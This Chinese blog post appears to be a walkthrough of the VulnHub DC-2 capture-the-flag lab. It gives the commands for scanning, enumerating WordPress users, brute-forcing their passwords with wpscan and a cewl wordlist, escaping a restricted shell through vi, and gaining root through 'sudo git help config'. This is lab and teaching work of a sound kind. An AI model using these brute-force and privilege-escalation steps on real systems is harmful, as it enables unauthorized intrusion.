---
title: VulnHub DC2 通关纪实
date: 2020-3-9 21:00:23
tags:
  - vulnhub
categories:
  - ctf
abbrlink: vulnhub-dc-2
---



写在前面：本站内容仅供技术交流分享，切勿非法使用，一切技术后果自行承担



上期回顾：[VulnHub DC 1 通关纪实](https://blog.xiabee.cn/posts/vulnhub-dc-1/)

DC 2 靶机下载地址：https://www.vulnhub.com/entry/dc-2,311/



渗透主机：kali 2020 

涉及渗透技术： 

* nmap 等扫描
* 本地域名解析 
* wpscan 扫描和攻击 
* cewl 针对性字典生成 
* git 提权



## 题目描述

![image-20230321154210123](https://s3.xiabee.cn/pic/2023/03/2f6545c6de85fda56a2eea4e1cd227c76415a39ee68cda192653a4938140aec2.png)



## 搭建靶机

和 [DC1](https://blog.xiabee.cn/posts/vulnhub-dc-1/) 一样，这里我们直接搭建在 VM 里面，保障靶机和渗透主机在同一网段即可，这里我们网络模式选择 NAT 模式，即共享IP地址



## 信息收集

渗透主机地址：**192.168.80.128**

![image-20230321154353148](https://s3.xiabee.cn/pic/2023/03/01980b8bfd8355935fb10b8836f60bb1a17b58d55f2fe148c67626e5e4583586.png)

靶机地址：**192.168.80.131**

![image-20230321154404028](https://s3.xiabee.cn/pic/2023/03/5e7bd70eff7cf212d9f9f3a7701779ce7e258e91447a15d11cc67c1c08a2443b.png)



发现 ip，直接 nmap 一顿梭：`nmap -A -p- -T4 192.168.80.131`

![image-20230321154438952](https://s3.xiabee.cn/pic/2023/03/f9953a5857e83d00144cbe20153d6e3b7ee182923597d362c45f75eba7018fbd.png)





发现开放了 80 端口和 7744 端口 然后康康他的网站目录，dirb 一顿梭：`dirb http://192.168.80.131`

![image-20230321154640381](https://s3.xiabee.cn/pic/2023/03/7c1c69fcd593f0deef36ead8fabacf66083a64963214fbb17fcb9bcaedde85cf.png)





dirb 爆破目录 看到熟悉的 "wp-admin"，基本可以确定是个  wordpress 的网站了 直接浏览器访问一下试试：

![image-20230321154705662](https://s3.xiabee.cn/pic/2023/03/3f49cada812e3785f850c50e2b284a06147308b7929922425dca08fbf7dea47c.png)





emmmm 靶机做了重定向，直接跳转到了http://dc-2，而且还没做域名解析...... 

我们整理一下信息： 

* 靶机开放了80端口 
* 80端口重定向到了 http://dc-2 
* 靶机CMS框架为 wordpress 
* 靶机开放了ssh端口



## 修改域名解析

既然靶机没有做域名解析，那就在主机本地做一次域名解析嘛

```bash
sudo chmod 777 /etc/hosts
# 修改权限，保证非root也可写可执行
vi /etc/hosts
# 进入vim修改hosts文件
```

手动添加 dc-2 的解析，保存并退出：

![image-20230321154808330](https://s3.xiabee.cn/pic/2023/03/c381b3e6d67bd9a5dbe1cd4bb4d85ee40e52af35b5280e562c87b189a035efb3.png)

修改hosts文件 

然后再次浏览器访问 http://dc-2：

![image-20230321154827502](https://s3.xiabee.cn/pic/2023/03/8995b81e1197803abb795463e717b018be362a32a5a1116c62f324e8694561e4.png)

此时看到了经典的WP主题



## 寻找 FLAG

### FLAG1

首页好大一个 **Flag** 按钮，直接点进去康康：![image-20230321154914261](https://s3.xiabee.cn/pic/2023/03/32363102ea470eb8af2aa748d1da9719a2cbe2002f42466b155a7a2f24bf9cbd.png)

> Flag 1: Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl. More passwords is always better, but sometimes you just can’t win them all. Log in as one to see the next flag. If you can’t find it, log in as another. 
>
> flag1提示



flag1暗示我们，常用字典可能不管用了，也许需要cewl一下



### FLAG2

话不多说，直接上 wpscan 开始跑

 ~~为什么不像 DC1 那样直接跑一顿 msf：试过了，只靠现有的payload好像打不下来......~~

那我们就先康康网站有哪些用户：

```bash
wpscan --url http://dc-2 -e u
#扫描wordpress中的发表过文章的用户
```

![image-20230321155026756](https://s3.xiabee.cn/pic/2023/03/17c1ad6c4b82e88b4bbfcf181e624e5f54def101b83d1665a418375595f13c55.png)

枚举用户名 扫描发现三个用户，分别为：admin, jerry, tom 

利用刚刚扫描得到的用户信息，通过 cewl 生成密码字典：

```bash
cewl http://dc-2 -w pass
# 针对 dc-2 这个网站生成字典，并保存在pass文件中
```

再创建一个 user 文件，保存刚刚扫出来的三个用户名

![image-20230321155119519](https://s3.xiabee.cn/pic/2023/03/67c7781873b2c1c83839b9e793fe1bfad4121c4a93242111c7aea4153fa2723f.png)

![image-20230321155127245](https://s3.xiabee.cn/pic/2023/03/70ca83486b79a1b216cb5edb02f35dc7c227781db33ee5af270a87c81a3066d3.png)

pass和user的文件内容

wpscan 爆破用户密码：

```bash
wpscan --url http://dc-2 -U user -P pass
# 对dc-2进行爆破，使用的字典为刚刚写的 user 和 pass
```

直接爆破，发现靶机没做防火墙，那莽就完事了......~~（我用同样的办法爆破我自己的博客，然后被防火墙封了四个小时www）~~



![image-20230321155203943](https://s3.xiabee.cn/pic/2023/03/95c4a0a3bca25074b3c189d02aa8c49e212f864ea57ff8f358c692a894926c7a.png)



爆破结果 此时看到，admin 的密码不在字典里面，但是 tom and jerry 都被爆出来了

* Username: jerry, Password: adipiscing
* Username: tom, Password: parturient



随便挑一个登陆后台，我们在 Pages 里面看到坨大一个 Flag2：

![image-20230321155258856](https://s3.xiabee.cn/pic/2023/03/1c3bde36b1e30781340cca6470e5274c9eff767ec5a5aee3cd2fdf8cb102f408.png)

Flag2

点进去康康：

![image-20230321155311953](https://s3.xiabee.cn/pic/2023/03/2e89eb08610181de15d2d052041c22016950b859a4c3554128b3b92fb8f93ae1.png)



> Flag 2: If you can't exploit WordPress and take a shortcut, there is another way. Hope you found another entry point. 
>
> flag2提示

意思就是直接爆破Wordpress是没用的，你得找别的方法进去......（和我们前期msf尝试的结果一样一样的



### FLAG3

直接用刚刚爆出来的两个账号 ssh 登录一下试试：

```bash
ssh tom@192.168.80.131 -p 7744
# 这里加个 -p 是因为靶机的ssh不是常用端口，需要指定一下
```

然后直接用刚刚爆破出来的密码"parturient"登陆进去：

![image-20230321155506493](https://s3.xiabee.cn/pic/2023/03/409a05f22f311ad522812585c11605181ad9093e1fb91f8760c3aa1485f66024.png)

tom 登陆成功 然后四处逛逛，发现他有 flag3，但是你看不了，因为你是 rbash......

<img src="https://s3.xiabee.cn/pic/2023/03/3766d41737b4a233c7506f8ee2ca965881f962c4bf9a3d9d88031b85f4acaccd.png" alt="image-20230321155526148" style="zoom:150%;" />

rbash

那先查看一下环境变量：`echo $PATH$`

<img src="https://s3.xiabee.cn/pic/2023/03/19bed3818c69d1c21be0a175248af05506ee9848735d4a0d3cf9262ea8f08539.png" alt="image-20230321155600035" style="zoom:150%;" />



还有救，我们尝试用vi转义一下shell，拿一个权限比较高的 bash shell出来

```bash
vi
:set shell=/bin/bash
:shell
# 这里利用的是vim命令模式，通过vim命令来设置shell转义
```

<img src="https://s3.xiabee.cn/pic/2023/03/cf278761d7f5824102336348c992ad02350dbab46d6571db15d0ea9534f02d60.png" alt="image-20230321155632261" style="zoom:200%;" />

然后设置环境变量：

```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
# 把刚刚设置好的shell导入环境变量中
```

<img src="https://s3.xiabee.cn/pic/2023/03/a8998ea642dd3555db8f165b1b2f98ada334a42ce956db7b8194fd2702188d14.png" alt="image-20230321155711221" style="zoom:200%;" />

此时的PATH已经变了

然后尝试cat一下，可以了：

![image-20230321155732923](https://s3.xiabee.cn/pic/2023/03/3e750eeb351de7a201c3b8e072b7485b264c77fa3d3d3aeea8d8edca53ba47ee.png)

> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 
>
> flag3提示



### FLAG4

flag3 暗示我们切换到 jerry 的用户去（Jerry的密码是adipiscing）

```bash
su jerry
cd /home/jerry
ls
cat flag4.txt
# 进去直接看到了flag4...
```

![image-20230321155847034](https://s3.xiabee.cn/pic/2023/03/3b33b3baa2a597b7033ed657979ccb7038a88fc6732b85a68e01c902769c659a.png)



> Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you're on your own now. :-) Go on - git outta here!!!! 
>
> flag4提示



### Final FLAG

先看一眼当前用户：`whoami`

<img src="https://s3.xiabee.cn/pic/2023/03/6bedca61df3ad57c6144ad34762668154a7b9fa371536ff4414126c67bb8a964.png" alt="image-20230321155933121" style="zoom:200%;" />



确认过眼神，还是jerry，没有 root 从天而降...... 

先`sudo -l `一下，看看 jerry 有哪些权限：

<img src="https://s3.xiabee.cn/pic/2023/03/fb79b083e11d01bf5220ad6c03ea01f66b4a0724030bcd4d83c0bca2974a4bcd.png" alt="image-20230321160001117" style="zoom:200%;" />



emmm jerry居然能以root身份去git，那没事了，开始提权 （而且flag4也暗示我们通过git提权，我们就上网找一个poc）

```bash
sudo git help config
# root权限打开git的配置，注意这里一定要sudo，不然是以普通用户身份打开git
```

![image-20230321160051663](https://s3.xiabee.cn/pic/2023/03/1cfc52ed386a17e7a59c48df793e3b6e9b17f878d15b8daab9c979bb8e9d1f7b.png)

多页分隔，绝佳的 hack 位点

```bash
!/bin/bash
# 直接在config里面输入命令，反弹bash
```

<img src="https://s3.xiabee.cn/pic/2023/03/cb0e08166d688b928b37bfef31c169ef799b4a9eb4d099aa0826d120ef92a197.png" alt="image-20230321160123058" style="zoom:200%;" />

回车，然后发现我们已经有了root 的shell：

<img src="https://s3.xiabee.cn/pic/2023/03/b159cc6b6ad57e4bb76e0c79f51c2431757815f4fe316281a413339defbb5acf.png" alt="image-20230321160142115" style="zoom:200%;" />

此时已是root

然后直接去老家看flag啦：

```bash
cd /root
ls
cat final-flag.txt
```

![image-20230321160207972](https://s3.xiabee.cn/pic/2023/03/14fa375cb0b3f79bfd7f8a2cfcfe43585e564d8ab2fdbb08d0ee4e5b90905b58.png)

> Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. Well done！



## 小结

整体来说 DC2 可能比 DC1 简单一点点，因为没有涉及 msf 的各种调试和数据库的修改 hhh 

~~当然这也可能是我的错觉~~

这次主要学到了git还能这样玩

下次的题下次再更，我是鸽手（x）